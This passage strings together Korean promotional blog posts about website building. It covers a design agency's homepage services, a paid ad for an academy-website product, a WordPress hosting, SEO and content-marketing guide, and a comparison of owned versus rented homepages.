것입니다.​​ ​​호스팅을 설치하였다면 도메인도 구매하여야하는데, 도메인이란 숫자로 이루어진 인터넷상의 컴퓨터 주소를 알기 쉬운 영문으로표현한 것을 말합니다.​홈페이지의 주소를 숫자로 입력하기에는쉽게 외우거나 읽기 어려워 영문으로 표시한것으로, http://mmcmso.com 이 홈페이지주소라면, www를 뺀 나머지 mmcmso.com부분을 도메인이라고 부르는 것인데요.​이러한 도메인에 대한 경쟁력이 온라인시장안에서는 치열한 편에 속한다고 합니다.​​ ​​또한 최근에는 모바일 시장이 활성화되면서PC위주로 활동하기보다는 모바일 위주의홈페이지인 반응형홈페이지가 많이 제작됩니다.​이 덕분에 시장 및 경쟁사 분석을 철저하게 분석하여 고객들의 눈에 띌 수 있는 홈페이지를개설하는데 힘을 쓰는 업체를 선정해야 합니다.​트렌드에 맞는 홈페이지제작부터 체계적으로관리해주는 업체 기적컨설팅을 소개합니다.​​ ​​기적컨설팅은 좋은 과정이 좋은 결과를 만든다는사실을 알고 있기에 다양한 웹사이트 제작경험을바탕으로 완벽한 결과를 만들기 위한 체계적인제작과정을 보유하고 있습니다.  1. 시장조사각 기업이 온라인 시장에서 나타내는 성향과특성을 충분히 파악하고 연구합니다.​2. 컨셉기획고객의 니즈와 기업의 특성을 정확하게 파악하여 아이덴티티를 충분히 적용시킨 독창적인컨셉을 기획합니다.​3. 개발다양한 경험과 노하우를 가지고 있는 기획자,디자이너, 퍼블리셔가 한 팀을 이뤄 개발에들어갑니다.​4. 테스트반복적인 테스트를 통해 한 치의 오차없이완벽한 결과물을 만들어 냅니다.​​ ​​기적컨설팅은 웹사이트제작부터 디자인을포함하여 사진 및 영상편집, 간판제작, 인테리어디자인까지 다양하게 진행하고 있는데요.​이를 통해 브랜드의 가치를 보다 상승시킬 수있도록 노력하며 소비자의 시선을 이끌 수 있는노하우를 갖추고 있어 이를 바탕으로 디자인및 홈페이지 구축을 진행하고 있습니다.​기업의 특성마다 다른 디자인으로 홈페이지를제작하고 있으며, 단순히 디자인만 생각하기보다는 마케팅까지 생각하여 제작합니다.​​ ​​홈페이지를 제작하고 난 후에는 기업홈페이지에얼마나 많은 고객이 방문하고 있는지는 마케팅,홍보 활동의 기본이자 필수 요소입니다.​따라서 기적컨설팅은 방문자 수를 체계적으로집계할 수 있는 프로그램을 구축하고 있습니다.​소비자의 시선을 끌어들이고 매출을 상승시켜주는 홈페이지제작 및 관리는 기적컨설팅에맡겨 보시는 것은 어떨까요?​ ​상단 사진을 클릭하시면 기적컨설팅의홈페이지제작 포트폴리오를 보실 수 있습니다.​ ​홈페이지제작 및 관리와 관련하여 궁금하신 사항이있거나 견적을 받아보고 싶으시다면 문의사항을상단사진을 클릭하여 남겨주세요!​ ​기적컨설팅과 카톡 친구를 맺어보세요!상담을 편리하게 받아보실 수 있습니다.​    브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작www.mmcmso.com 기적컨설팅서울특별시 강남구 도산대로 176 대광빌딩 3층 기적컨설팅 ​ ​수능이 다가오면서 더욱 중요해진 학원, 무엇을 보고 선택하시나요?요즘은 직접 상담을 가는 것이 아니라 학원의 홈페이지를 보고 선택하시는 경우가 대부분입니다.학원 홈페이지를 구축하고 관리, 운영까지 해야 하는 데 어떻게 시작을 하고 운영해야 할지 고민하고 계실 사업장님들을 위해 스마트하게 학원 관리할 수 있는 방법에 대해 소개해드리려 합니다. 효율적이고 쉬운 학원관리, 학원홈페이지제작 학원사랑넷에 대한 설명 시작하겠습니다. ​ ​33만원의 거품없는 착한 구축비용, 월 22,000원의 저렴한 월 사용료로 부담 없이 홈페이지를 사용할 수 있습니다.비용 효과적인 학원사랑넷은 10여년 디자인제작 경험이 있는 디자이너가 감각적으로 만든 홈페이지 디자인을 제공합니다. ​ ​언제든 직접 게시판, 자료실, 사진앨범을 무제한으로 생성하고 사용이 가능합니다.학원의 최신 이미지를 추가하고자 할 때는 업체에 의뢰하고 기다릴 필요 없이 직접 추가하고 수정하실 수 있습니다. ​ ​홈페이지 수정 시스템을 제공으로 메인화면 이미지 교체, 문구수정, 콘텐츠 수정 등 업체에 의뢰하여 기다리는 시간없이 직접 쉽고 빠르게 수정이 가능합니다.수정할 시에는 디자이너가 아니라도 홈페이지 디자인을 한글이나 파워포인트 문서수정 하듯이 수정할 수 있는 시스템과 샘픔들을 제공하여 누구나 쉽게 홈페이지 디자인을 수정할 수 있습니다. 혹시라도 잘못 수정한 경우에는 제공된 자동 복구 기능을 이용하여 버튼한번 클릭으로 바로 원상복구가 가능합니다. ​ ​학원 스타일에 맞는 기본이미지를 제공하며 지금 막 오픈하여 학원에서 주시는 사진이 적더라도 학원홈페이지제작이 가능합니다. 학원홈페이지제작을 돕는 자료수집용 웹하드를 제공하여 홈페이지 구축자료도 편리하게 전달할 수 있답니다. ;)​ ​반응형 홈페이지를 33만원으로 PC + 태블릿 + 스마트폰용 홈페이지로 구축이 됩니다컨텐츠를 PC, 태블릿, 스마트폰 형식으로 각각 제작할 수 있어 다양한 기기에서 편하게 사용될수 있는 디자인 작업이 가능합니다.모바일 카카오톡에 노출되는 링크 이미지도 간편하게 설정 가능하여 홈페이지 홍보에 디테일을 더하고 관리자보안설정기능으로 관리자 계정을 타인이 부정하게 사용하는 것을 방지하도록 3단계에 걸쳐 보안을 강화하였습니다. ​ ​스마트하게 학원을 운영하면서 많이들 사용하고 계시는 온라인 강의도 학원사랑넷은 기본적인 온라인 강의 시스템 구축이 가능합니다온라인 강의를 준비하거나 소규모로 진행하고자 하는 학원에어도 이용이 가능합니다. 온라인 강의 시스템에 결제기능을 추가하여 유료서비스도 이용이 가능하며 단일 강좌서비스 말고도 패키지관리 기능을 통해 강좌를 묶어 판매할 수 있는 시스템도 제공되고 있습니다. 또한 온라인 강의시스템에는 강사관리, 강좌관리, 수강자 관리 등 영역별로 관리가 가능하여 강의 시스템을 효율적으로 관리할 수 있습니다. 접속 통계 자료도 제공하니 홈페이지 관리 및 운영 방향을 효율적으로 모니터링할 수 있습니다. ​ ​레벨과 그룹 자동 승인 기준을 설정만 해놓으면 레벨과 그룹이 자동 변경되어 회원관리가 더욱 편리합니다온라인 강의 시 학년별, 과목별 시청권한을 부여할 수 있으며 강의를 얼만큼 들었는지 진도도 확인이 가능합니다. ​ ​팝업 제작 시스템 제공으로 5분 이내 빠르게 직접 생성이 가능합니다. 업체에 의뢰하고 기다리는 불편함 없이 쉽고 빠르게 무료로 공지 팝업이나 이벤트 팝업을 생성할 수 있으며 한 번에 여러개 팝업도 동시에 운영이 가능합니다​ ​스마트하고 어디서든 홈페이지를 운영할 수 있는 방법, 학원사랑넷.거품없는 구축비용 33만원, 저렴한 월 사용료 22,000원으로 학원홈페이지제작 학원사랑넷으로 시작해보세요. :)​​ 학원사랑넷학원 홈페이지 제작, 스마트폰 홈페이지, 쉽고 편한 관리 시스템www.hakwon-love.net ​​■ 위 포스팅은 소정의 원고료를 받고 작성되었습니다 ■ 워드프레스 홈페이지 제작 관리가 누구나 가능하다고 말하지만 실제 이용하기 위해 워드프레스에 대한 정보를 찾다보면 초보자에게 익숙하지 않은 용어나 해외 프로그램이라는 점에서 포기하는 분들이 많습니다. 또한 많은 분들이 윅스와 워드프레스를 비교해서 윅스가 더 쉽고 좋다고 평가하는데 이 부분에 저는 동의하지 않습니다.​워드프레스를 이용하고 있는 사람으로써 또한 호스팅 코딩 seo 등 모든 과정을 혼자서 해왔던 경험을 통해 워드프레스는 가장 진보한 cms 이며 누구나 쉽게 사용 가능하다는 것을 보장합니다. 다만 쉽게 포기하는 분들에게는 어떤 프로그램도 결코 홈페이지 제작 관리가 가능할 수 없다는 사실을 전달해 드리면서 홈페이지 제작과 관리 방법을 소개합니다.​ 워드프레스 홈페이지 제작에 필요한 기본 사항 ​ 워드프레스 호스팅 어떤 웹사이트를 원하는가에 따라 달라질 수 있지만 워드프레스를 이용한 홈페이지 제작 시 가장 먼저 필요한 것은 사이트 규모를 결정하는 것입니다. 호스팅을 위해서는 사이트의 전체적인 규모가 결정되야 상품을 선택할 수 있고 호스팅을 시작하기 때문인데요. 최근 가장 많이 관심이 집중되고 있는 개인 쇼핑몰 홈페이지의 경우 지속적으로 상품에 대한 컨텐츠 발행이 목적이라면 웹 저장 공간이 필요하고 이용자 유입을 생각한다면 트래픽 양도 어느정도 유지되는 호스팅 계획을 짜야 합니다.​호스팅 업체를 선정하기 위해 고민하는 분들이라면 기본적으로 위에 설명한 사이트 규모나 미래에 대한 계획이 있는 경우지만 처음 시작하는 분들에게는 호스팅이라는 분야 자체가 어려울 수 있어 필자가 추천하는 호스팅 업체와 상품은 "사이트그라운드 GrowBig"이라는 상품입니다. 처음 가입 시 월 12000원 가량 호스팅 비용이 발생하며 20GB의 웹 공간을 제공하고 월 트래픽 25000명이 가능합니다. 물론 업데이트 가능한 상품이며 해외 호스팅 업체로 워드프레스 호스팅에 특화된 사이트그라운드는 전문적인 워드프레스 프로그래머들이 가장 많이 추천하고 있는 호스팅 업체라는 점도 좋은 평가의 기준이 되고 있습니다.​해외 호스팅 업체 이용에 대한 세부적인 정보는 이전 이슈앤리뷰 포스팅을 참고해 보시는 것을 추천드리고 실제 사이트그라운드 이용 방법인 호스팅 과정이 궁금하신 분들은 하단의 링크를 참조하시기 바랍니다.​사이트그라운드 호스팅 안내와 이용 방법 워드프레스 코딩만약 여러분이 사이트그라운드를 이용해 호스팅을 시작했다면 워드프레스 설치까지 완료 되었을 것입니다. 설치된 워드프레스 관리자(알림판)페이지를 이용하는 순간부터 코딩이 시작되었다는 의미입니다. 워드프레스는 해외 프로그램인 관계로 한국어로 변경하고 한국 시간대로 바꿔주는 것이 필요한데 이를 SETTING 과정이라 합니다. ​워드프레스 초기 셋팅 과정은 이전 포스팅을 참고 하시기 바랍니다. 워드프레스 코딩에서 여러분이 가장 많이 사용하는 요소는 테마와 플러그인입니다. 테마는 전체적인 웹사이트의 틀이라 할 수 있고 플러그인은 테마가 제공하지 않는 부분들을 필요에 따라 추가할 수 있는 요소라고 생각할 수 있습니다.​필자는 오직 테마와 플러그인을 이용해 홈페이지 제작 관리가 가능하다고 생각하고 있는 1인이며 전문 프로그래머 못지 않는 퀄리티 있고 안정적인 웹사이트 제작 관리가 가능하다고 믿는 사람입니다. 물론 경험을 통해 가지고 있는 디자인 노하우나 검색엔진 관련 지식은 차이가 있겠지만 상상력을 이용해서 멋진 홈페이지를 제작할 수 있다는 부분은 누구도 부인할 수 없는 워드프레스만의 특별함이 될 것입니다.​워드프레스 코딩으로 구분되는 것들은 홈페이지 디자인을 시작으로 각각의 페이지와 단일 포스팅을 발행하는 과정 등 다양하지만 실제 워드프레스 제작 단계는 테마와 플러그인 설치 후 완료 된다고 볼 수 있습니다. 필자의 경우 다양한 시도를 경험했고 혼자서 워드프레스를 이용해 여러 웹사이트를 제작하고 폐기한 결과로 얻은 노하우는 가장 심플한 홈페이지를 통해 상상력을 이용해서 이용자가 가장 쉽게 이용할 수 있는 구성을 해야 한다는 결론을 가지고 있습니다.​개인적인 취향 차이를 고려하더라도 최근 홈페이지 디자인의 방향은 심플함이 대세입니다. 워드프레스 코딩을 어렵게 생각할 이유는 없습니다. 테마를 잘 선택하고 "사용자 정의하기"기능을 활용해서 원하는 모습의 웹사이트를 만드는 일련의 과정은 한 번에 가능한 것이 아니고 다양한 웹사이트를 확인하고 실제 모방하는 과정에서 자신만의 홈페이지를 구축할 수 있습니다. 워드프레스 검색엔진 최적화사실 워드프레스를 사용하는 가장 중요한 이유는 검색엔진 최적화 기능 때문입니다. 실제 SEO와 관련한 정보들의 경우 100% 정답은 존재하지 않습니다. 다만 포털 크롤러가 원하는 방식으로 컨텐츠를 발행하고 꾸준하게 가치 있는 정보를 발행하는 것이 최선이라는 점은 필자도 동의하는 검색엔진 최적화 방법입니다.​이번 포스팅을 통해 한 가지 팁을 제공하자면 여러분의 웹사이트가 검색 순위 1면에 확인되기를 바란다면 타겟 설정을 확실하게 해야 한다는 것과 타겟 페이지에 대한 지속적인 업데이트가 필요한다는 것입니다. 예를 들자면 워드프레스 홈페이지 제작이라는 키워드 검색에서 자신의 홈페이지가 확인되기를 원한다면 홈페이지 타이틀은 반드기 워드프레스 홈페이지 제작이라는 단어가 포함되야 하며 관련 정보가 지속적으로 발행되는 것이 해당 페이지에서 확인 가능해야 합니다.​필자가 이전에 소개한 KBoard 게시판을 이용해서 해당 홈페이지에 게시판을 설치하고 게시판을 통해 관련 키워드가 포함된 정보를 매일 매일 업데이트 한다면 어떤 결과가 발생할까요? 이런 방법으로 워드프레스 홈페이지 제작이라는 검색 키워드 1면에 등록이 가능할까요? 이 글을 신뢰하는 분들이라면 제안합니다.​여러분이 원하는 검색 순위는 어느정도 방식만 알고 있다면 언제든 가능하며 실제 필자가 운영하고 있는 웹사이트는 네이버와 구글 1면에 필요한 키워드를 등록하고 있습니다. 물론 방금 소개해 드린 방식을 적용해서 말입니다.​검색엔진 최적화에 대한 더 세부적인 요소들이 있지만 이번 포스팅을 통해 한번에 소개하기에는 그 분량이 여의치 않아 추후 포스팅을 통해 SEO 관련 정보들을 더 소개해 드리도록 하겠습니다. ​ 워드프레스 홈페이지 관리에서 가장 중요한 것은? ​ ​홈페이지 제작 이후 관리를 할 수 없다면 워드프레스를 사용해야 할 이유가 사실 없습니다. 워드프레스의 가장 중요한 장점을 버려두고 굳이 더 쉽고 간편한 윅스같은 CMS를 이용하면 될 일을 워드프레스로 고집할 필요가 없기때문인데요. 워드프레스는 꾸준한 관리를 통해 전체적인 웹사이트를 완성해 가야 하는 것이 최선의 방법입니다.​그렇다고 관리가 어렵다면 누구나 쉽게 할 수 있다고 말할 수 없겠죠? 워드프레스 관리의 핵심은 꾸준한 컨텐츠 발행입니다. 즉 블로그 운영처럼 포스팅을 꾸준하게 발행하는 것인데요 이것으로 인해 검색엔진 최적화가 자연스럽게 완성되고 홈페이지 구성을 할 수 있게 됩니다. 홈페이지나 웹사이트를 전체적으로 짜임세 있게 만들기 위해서는 컨텐츠 분류가 필요합니다. 카테고리 활용하기워드프레스 관리의 핵심은 카테고리를 잘 활용하는 것입니다. 잘 분류된 카테고리는 홈페이지 컨텐츠 소개나 유입된 이용자가 웹사이트에 머물 수 있게 하는 최선이 방법이 되며 단일 포스트를 제공할 때 카테고리를 잘 활용해야 합니다. 단일 포스트 템플릿의  활용워드프레스에는 템플릿을 이용해서 포스팅을 보다 편리하게 할 수 있는 기능이 있습니다. 우선 템플릿을 저장할 때 카테고리 별로 저장하는 방법이 있는데 이는 지속적인 컨텐츠 발행 과정에서 꼭 필요한 조치입니다. 만약 여러 카테고리를 사용하고 있다면 이 부분은 절대 간과해서는 안됩니다. 왜냐하면 템플릿에 저장된 소개 글이나 다른 페이지 이동 링크가 계속 동일하게 반복되는 컨텐츠는 검색엔진 최적화에 나쁜 영향을 줄 수 있기 때문입니다.​다양한 템플릿을 저장하되 통일된 느낌을 가지는 노하우가 필요할 것입니다.​컨텐츠 관리 이외에도 워드프레스 관리로 분류할 수 있는 부분은 미디어 관리입니다. 미디어는 사진을 포함한 동영상 등으로 볼 수 있는데 최초 워드프레스에 업로드 시킬 때 압축 과정이 필요하고 미디어의 경우 컨텐츠 질을 반영하기 때문에 썸네일 제작도 신경써야되는 부분이 있습니다.​특히 사진의 속성 관리에 전혀 신경을 쓰지 않는 이용자들이 많은데 이는 검색에 불리하게 작용됨을 기억해야 합니다. 워드프레스는 꾸준한 관리가 필요한 CMS이지만 하루 하나의 컨텐츠를 발행한다는 생각으로 좋은 정보를 제공한다면 유입률을 비교해 볼때 최고의 선택이 될 것입니다.​여기까지 워드프레스 홈페이지 제작과 관리에 필요한 핵심적인 내용들을 소개해 드렸습니다. 어렵게 생각한다면 모든 것이 어렵다는 말이 있습니다. 필자가 여러분에게 드릴 수 있는 확실한 사실은 제가 혼자서 할 수 있었던 워드프레스 제작 관리를 누구나 가능하나는 것이 입증된 사실이라는 점입니다.​상상력을 이용해서 전문가보다 더 멋진 홈페이지를 제작할 수 있는 초보자가 원하는 홈페이지는 오직 워드프레스만이 가능하다는 것이 이 글을 쓰고있는 필자의 생각입니다. 콘텐츠 마케팅 분야에서 꼭 필요한 요소는 콘텐츠를 제작하고 관리할 수 있는 플렛폼입니다. 대표적인 콘텐츠 마케팅 분야인 블로그 운영의 경우에서도 해당 블로그 계정이 바로 콘텐츠를 발행하는 플렛폼 역활을 한다고 볼 수 있습니다. 마케팅에 최적화된 워드프레스 홈페이지를 통해 콘텐츠를 제작하고 관리하는 콘텐츠 마케팅 방법에 관해 이야기 합니다.   ​  워드프레스 홈페이지는 콘텐츠 마케팅에 최적화된 플랫폼 역활을 수행합니다. ​콘텐츠 마케팅이란 잠재적인 고객이나 고객을 대상으로 필요한 정보를 제공하여 궁금적으로 자사의 제품이나 서비스를 이용하게 하기 위한 온라인 마케팅 방식입니다. 콘텐츠 마케팅의 중요성은 갈수록 커지고 있으며 이미 세계의 주요 브랜드는 콘텐츠 마케팅에 주력하는 전략으로 장기적인 광고 전략을 실행하고 있습니다.​콘텐츠 마케팅 방식을 간단하게 소개하자면 가치 있는 정보를 일관성 있는 주제로 꾸준하게 제공하는 것으로 잠재적인 고객에게 자사의 브랜드에 대한 호감과 신뢰도를 가질 수 있도록 하는 방법으로 진행됩니다.콘텐츠 마테팅에서 중요한 것은 제공자가 원하는 바를 전달하는 것이 아닌 검색자가 원하는 콘텐츠를 발행해야 한다는 점입니다. 콘텐츠 마케팅을 위해서는 플랫폼이 필요합니다. 인터넷 플랫폼이란 하나의 정보를 상품으로 가정할 때 정보를 제공하는 사람과 구매하는 사람을 연결시키는 역활을 하는 곳을 말합니다. 블로그, 카페, 홈페이지, sns, 네이버, 구글, 다음 등 정보를 등록할 수 있고 확인할 수 있는 모든 곳은 플랫폼이라 할 수 있습니다.​워드프레스 홈페이지는 꾸준하게 일관성 있는 콘텐츠를 다양한 방식으로 전달할 수 있는 플랫폼 역활을 충실하게 수행할 수 있으며 당신이 주체가되어 관리하고 영역을 확대할 수 있다는 부분에서 콘텐츠 마케팅에 최적화 된 홈페이지라 할 수 있습니다.​​​콘텐츠 마케팅을 대표할 수 있는 분야는 블로그 마케팅입니다. 검색엔진을 통해 필요한 정보를 찾는 잠재적인 고객을 대상으로 다양한 블로그들이 마케팅을 하고 있다는 것은 누구나 알고 있는 사실이지만 단순하게 브랜드나 상품을 홍보하는 블로그에 반응하는 고객은 이제 찾기가 어렵습니다.​우리는 워드프레스 홈페이지를 이용해서 실제 매출을 올릴 수 있는 콘텐츠 마케팅을 시작할 수 있고 이 방법은 오랜기간 당신의 사업에 있어 가장 강력한 홍보 방식이 될 것입니다.  ​  마케팅을 위한 워드프레스 홈페이지 제작 관리와 콘텐츠 발행 ​필자가 생각하는 워드프레스 홈페이지란 콘텐츠 마케팅을 위해 만들어진 프로그램입니다. 사실 처음 워드프레스가 개발된 목적은 블로그 운영 프로그램으로 출발합니다. 네이버나 구글 등이 제공하는 블로그 운영의 한계를 워드프레스가 대신하고 있다는 사실은 누구도 부정할 수 없습니다. ​홈페이지와 블로그를 함께 운영한다는 단순한 사실이 아니더라도 구글 최적화나 모바일 친화성이라는 점도 콘텐츠 마케팅을 위한 기본적인 요소를 워드프레스는 제공하고 있습니다. 이제 당신은 워드프레스 홈페이지 운영만으로 반 영구적인 인터넷 마케팅 수단을 유지할 수 있으며 가장 강력한 콘텐츠 마케팅 플랫폼을 구축하게 될 것입니다.  워드프레스 홈페이지 제작 관리워드프레스 홈페이지 제작은 직접 하는 방법과 웹에이전시를 통해 사이트를 구축하는 두 가지 방법이 있습니다. 하지만 콘텐츠 마케팅이 목적이라면 홈페이지 관리는 당신이 직접 해야 합니다. 홈페이지 제작 대행 업체가 당신의 사업과 관련성이 있는 양질의 콘텐츠를 꾸준하게 발행하는 역활을 해주기를 기대하지 않는다면 말이죠.​워드프레스 홈페이지를 제작하는 방법에 관해 잠깐 설명하자면 자신의 플랫폼으로 사용하려는 목적이라면 가입형(네이버 블로그 처럼 회원 가입 후 사용하는 방식)워드프레스가 아닌 설치형 워드프레스를 운영해야 합니다.​설치형 워드프레스란 호스팅(도메인 생성, 서버 등록) 과정이 필요하고 워드프레스 설치 후 기본적인 사용자 정의(설정)를 통해 테마와 플러그인 등을 이용해서 홈페이지 디자인 부터 각각의 페이지를 생성하는 등에 코딩 과정이 필요합니다. 여기까지가 워드프레스 제작에 필요한 과정이며 이후 실제 콘텐츠 마케팅을 위한 검색엔진 최적화 관리가 필요합니다.  워드프레스 홈페이지 콘텐츠 마케팅워드프레스 홈페이지를 이용한 콘텐츠 마케팅의 시작은 포스팅을 발행하는 것입니다. 이는 워드프레스 홈페이지 최적화 작업에도 필수적인 요소이며 블로그 이외에도 게시판을 활용한 콘텐츠 제작이나 각 각의 페이지를 콘텐츠로 활용하는 방법 등 다양하게 콘텐츠 마케팅을 시도할 수 있습니다.​워드프레스 홈페이지 자체가 하나의 마케팅 콘텐츠가 되고 이를 이용해서 잠재적인 고객에게 당신의 사업과 관련성이 있는 가치 있는 정보를 꾸준하게 제공할 수 있어야 합니다.​필자는 당신이 워드프레스 홈페이지를 단순하게 개인이나 기업의 소개로 사용하기 보다 적극적인 자세로 콘텐츠 마케팅에 활용하기를 추천합니다. 그러기 위해서는 워드프레스에 대한 지식과 콘텐츠 마케팅 역량을 키워야 하며 미래를 보고 시간과 노력을 투자할 수 있는 여유가 필요합니다.​서두에 말한 것처럼 앞으로 온라인 마케팅을 선도하는 브랜드는 콘텐츠 마케팅 분야를 주도하는 곳이 될 것입니다. 이미 코카콜라나 레드불 같은 유명 브랜드들은 콘텐츠 마케팅을 전체 마케팅에서 가장 중요한게 생각하고 자사 홈페이지를 통해 마케팅 분야를 선도하고 있습니다. 국내 벤처 기업들의 경우에도 콘텐츠 마케팅 방식으로 브랜드를 홍보하고 있는 사례는 얼마든지 찾아볼 수 있습니다.  ​  맺음말 비대면 시대로 접어들면서 상품이나 서비스를 제공하는 입장에서 독자적인 플랫폼 구축의 중요성은 커지고 있습니다. 또한 콘텐츠 마케팅을 통한 브랜드 홍보는 그 효과적인 측면에서도 비용이 적게 드는 반면 장기적으로 효과를 볼 수 있고 고객에게 신뢰감을 준다는 장점을 가지고 있습니다.​저는 당신에게 자사에 호의적인 잠재적 고객을 유치할 수 있고 지속적인 마케팅 효과를 기대할 수 있으며 무엇보다 비용이 적게 드는 콘텐츠 마케팅을 시작하지 않을 이유가 있는지 물어보고 싶습니다.​또한 지금 당신이 구상하고 있는 사업을 위해 잠재적인 고객을 지금부터 형성할 수 있는 콘텐츠 마케팅과 워드프레스 홈페이지 운영을 지금 당장 시작하지 않는 이유를 또 한번 물어보고 싶습니다.​워드프레스 제작이나 관리 정보와 함께 검색엔진 마케팅에 관련한 소식들에 관심이 있다면 필자의 블로그와 함께 하단에 마련된 myweb 홈페이지 방문을 통해 필요한 정보를 확인할 수 있습니다. 필자 또한 검색엔진 마케팅에 관심이 있어 공부하고 있으며 스스로 이해된 부분이나 새롭게 알게된 사실등을 당신과 공유하기 위해 지속적인 포스팅을 약속하면서 워드프레스와 콘텐츠 마케팅에 관한 이야기를 주제로한 포스팅을 마칩니다.​  ​  더 많은 워드프레스 홈페이지 제작 관리 정보가 필요하다면...... ​워드프레스 초보자를 위한 정보 사이트 myweb-wordpress에 방문해 보세요. 스스로 제작 가능한 워드프레스 홈페이지 관련 정보를 확인할 수 있고 실제 워드프레스 호스팅부터 코딩 seo 관리까지 웹사이트 제작과 관리에 필요한 정보를 제공하고 있습니다.​빠르고 쉽게 홈페이지를 만들고 혼자서 관리할 수 있는 워드프레스를 통해 비대면 시대를 준비하는 것은 의미가 있는 시간이 될 것입니다.  블로그에서 발행된 기본적인 정보 이외에도 워드프레스 홈페이지 운영을 위한 플러그인과 테마 관련 소식까지 확인할 수 있습니다.​워드프레스 웹사이트 제작 대행의 경우 합리적인 비용으로 제공되며 제작 기간도 길지 않아 국내에서도 많은 사업장이나 개인과 기업들이 사용하고 있습니다. myweb 홈페이지를 통해 웹사이트 주문 제작은 물론 홈페이지 seo 관리를 지속적으로 가능할 수 있도록 사용자 홈페이지 운영 가이드를 구축하고 있습니다.​▶myweb 홈페이지 바로가기 워드프레스 웹사이트 제작 관리 / 반응형 홈페이지 만들기 - myweb워드프레스 웹사이트 홈페이지 제작 seo 관리 등 워드프레스 웹사이트 제작 관리 정보를 제공합니다. 워드프레스 웹사이트 디자인 템플릿 myweb 워드프레스 웹사이트 제작 템플릿기업 개인 홈페이지 만들기를 위한 워드프레스 웹사이트 디자인 샘플을…myweb-wp.com ​ 독립형홈페이지지속적인 홈페이지 관리를 위해우리나라는 국내 스마트폰의가입자 수가 5000만 명을 넘어서면서1인 1스마트폰 시대를 맞이하게 되었는데요.​따라서 대부분의 국민들이언제 어디서나 손쉽게인터넷을 활용할 수 있는환경에 들어서게 되었습니다.​ ​이렇다 보니 많은 곳에서인터넷을 이용한 여러 가지홍보 방식을 취하고 있는데요.​다양한 종류의 방식 중에서도인터넷을 통해 홍보를 시작할 때가장 먼저 제작해야 하는 것은홈페이지라고 할 수 있습니다.​우리가 인터넷으로어떠한 정보를 알아보거나물건을 구매하거나 할 때엔공통적으로 홈페이지에 접속하여위와 같은 활동을 하게 되는데요.​ ​홈페이지는 안에 어떤구성요소를 담느냐에 따라홈페이지의 성격이 모두 달라지기 때문에만들려고 하는 목적에 맞게홈페이지를 제작하는 것이 좋습니다.​이렇게 된다면 온라인 홍보의첫 시작을 원활하게 할 수 있는데요.​하지만 구성요소를 정하기 앞서홈페이지 제작 유형을 정확하게선택 후에 진행해야 합니다.​ ​홈페이지 제작 유형은임대형홈페이지와 독립형홈페이지두 가지로 나누어진다고 볼 수 있습니다.​임대형 홈페이지는말 그대로 홈페이지를빌려서 사용하는 것을 말하는데요.​제작 비용이 저렴하긴 하지만홈페이지의 소유권을 직접가질 수가 없어 향후 업데이트나수정사항이 있을 때 어려움을 겪을 수 있다는단점을 가지고 있습니다.​ ​또한 홈페이지 제작 업체가없어질 경우 홈페이지도 함께 사라지게 되는데요.​.반면에 독립형홈페이지는임대형 홈페이지의 단점을 보완해줄 수 있는 제작 유형입니다. 독립형홈페이지란 무엇인가?독립형홈페이지란?임대형홈페이지와 달리홈페이지의 소유권을직접 가질 수 있다는 큰 장점을가지고 있습니다.​ ​최근엔 인터넷 환경이계속해서 빠른 속도로 변화하고 있는데요.​이렇기 때문에 홈페이지도변화하는 환경에 맞춰 지속적으로업데이트를 진행해 줘야 합니다.​따라서 홈페이지 관리를 쉽게 할 수 있는제작 유형인 독립형홈페이지가다양한 업데이트와 수정에 있어서유용하게 사용될 수 있는데요.​ ​원활한 업데이트뿐만 아니라추후 홈페이지 내의 수정사항이생겼을 때에도 손쉽게 수정이 가능하기 때문에꾸준한 홈페이지 관리를 원하시는분들에게 추천하는 방식입니다.​또한, 임대형홈페이지는정해진 템플릿 안에 텍스트와 이미지를넣어 홈페이지가 제작되는데요.​반면에 독립형홈페이지의 경우정해진 템플릿 없이 자유롭게 디자인이가능하기 때문에 표현의 제약 없이여러 가지 표현 방법을 구사할 수 있습니다.​ ​이것으로 차별화된 맞춤 디자인이나오게 되고, 우리 홈페이지를방문하는 고객들을 더 오래머물게 할 수 있는 중요 수단이 됩니다.​여기까지 독립형홈페이지에 대하여간단하게 소개들 해드렸는데요.​그렇다면 독립형홈페이지를제작하기 위한 업체 선택은어떻게 진행하는 것이 좋을까요?​ ​첫 번째는 모바일 홈페이지가함께 제작이 되는지체크해보시는 걸 추천드립니다.​위에서 설명한 것과 같이현재 1인 1스마트폰 시대를살고 있는 우리 환경을 생각해 보면쉽게 이해가 되실 텐데요.​아무래도 데스크톱보단 스마트폰을이용하여 인터넷을 접속하는경우가 더 많기 때문에 사람들의스마트폰 이용률에 따라 모바일 홈페이지도함께 제작을 진행하는 것을 권장드립니다.​ ​일반 홈페이지와 모바일 홈페이지를각각 제작하는 업체도 종종 있지만최근엔 반응형홈페이지 제작을 통해한꺼번에 제작을 진행하는 업체도 많으니이 부분을 꼼꼼하게 확인하시길 바랍니다.​다음은 업체의 포트폴리오인데요.​포트폴리오는 해당 업체가 얼마나많은 제작 경험을 가지고 있는지또 제작된 홈페이지들이 어느 정도의퀄리티를 가지고 있는지 보여줄 수 있는중요한 수단으로 작용하게 됩니다.​ ​따라서 해당 업체의 포트폴리오를 통하여디자인부터 구성요소까지여러 가지 부분을 살펴보신 후선택하는 것이 중요합니다.  기적 컨설팅은 판매, 소통, 소개형 등홈페이지를 제작하는 여러목적에 따라서 다양한 디자인을 통해독립형홈페이지를 제작하고 있는데요.​뿐만 아니라 PC나 모바일 등여러 종류의 스마트 기기에서도최적화된 홈페이지를 제공하기 위해반응형홈페이지로 함께 제작을도와드리고 있습니다.​독립형홈페이지를 제작하는많은 곳들이 생겨나고 있는 지금!​기적 컨설팅과 함께우리 회사만이 가지고 있는이미지를 강화하여 경쟁력 있는독립형홈페이지제작을진행해 보시는 건 어떠신가요?​ ​위 사진을 누르시면기적 컨설팅에서 제작한홈페이지 포트폴리오 확인이 가능합니다!​ ​독립형홈페이지 제작 관련추가 문의사항이 있으시다면언제든 편안하게 문의해 주세요^^​ ​카카오톡 친구를맺으시면 실시간 상담도 가능합니다.​   브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 